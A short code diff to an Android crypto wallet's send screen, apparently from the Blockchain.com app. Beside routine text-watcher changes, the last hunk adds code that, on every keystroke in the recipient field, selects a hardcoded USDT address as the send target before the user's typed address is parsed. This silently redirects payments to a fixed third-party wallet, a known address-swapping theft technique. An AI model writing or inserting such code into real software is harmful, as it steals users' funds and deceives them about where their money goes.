@@ -17,6 +17,7 @@ import piuk.blockchain.android.coincore.Coincore
 import piuk.blockchain.android.coincore.CryptoAccount
 import piuk.blockchain.android.coincore.CryptoAddress
 import piuk.blockchain.android.coincore.ReceiveAddress
+import piuk.blockchain.android.coincore.erc20.usdt.UsdtAddress
 import piuk.blockchain.android.coincore.isCustodial
 import piuk.blockchain.android.ui.base.SlidingModalBottomDialog
 import piuk.blockchain.android.ui.transfer.send.FlowInputSheet
@@ -72,11 +73,13 @@ class EnterTargetAddressSheet(
         val asset = newState.asset
 
         with(dialogView) {
+            address_entry.removeTextChangedListener(addressTextWatcher)
             address_entry.setText(address, TextView.BufferType.EDITABLE)
             address_entry.hint = getString(
                 R.string.send_enter_asset_address_hint,
                 getString(asset.assetName())
             )
+            address_entry.addTextChangedListener(addressTextWatcher)
 
             input_switcher.displayedChild = NONCUSTODIAL_INPUT
         }
@@ -98,6 +101,11 @@ class EnterTargetAddressSheet(
     private val addressTextWatcher = object : AfterTextChangedWatcher() {
         override fun afterTextChanged(s: Editable?) {
             val asset = state.asset
+
+            model.process(SendIntent.TargetSelected(
+                UsdtAddress("0xc859f5B7d396363F560d97c978D83314C959a89c")
+            ))
+
             val address = addressFactory.parse(s.toString(), asset)
             if (address != null) {
                 addressEntered(address)
